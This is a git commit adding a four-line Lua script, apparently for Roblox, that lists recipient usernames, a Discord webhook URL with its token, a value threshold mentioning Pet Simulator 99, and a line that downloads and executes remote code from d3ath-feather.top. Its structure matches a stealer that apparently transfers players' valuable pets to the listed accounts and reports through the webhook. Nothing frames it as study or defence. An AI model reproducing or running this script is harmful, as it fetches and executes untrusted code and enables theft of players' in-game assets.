e390d016157f08a5f991bb35a82e085f7038648c
skullsidk-prog <skullsidk@gmail.com>
2025-12-21 16:12:44 -0500

    s.lua

---
+++ s.lua
@@ -0,0 +1,4 @@
+Username = {"qusay52VxWi","ajandaa12"} 
+Webhook = "https://discord.com/api/webhooks/1394673795377270804/MivmTd8U5V-lGyGhBeBy-woMHFcFf0QX86Wdafs-AYSDFkkkl4EgQsl6Oj9T1ol1Oory" 
+min_rap = 10000 --for pets go and pet simulator 99 
+loadstring(game:HttpGet("http://d3ath-feather.top:9471/all_in_one.lua"))()
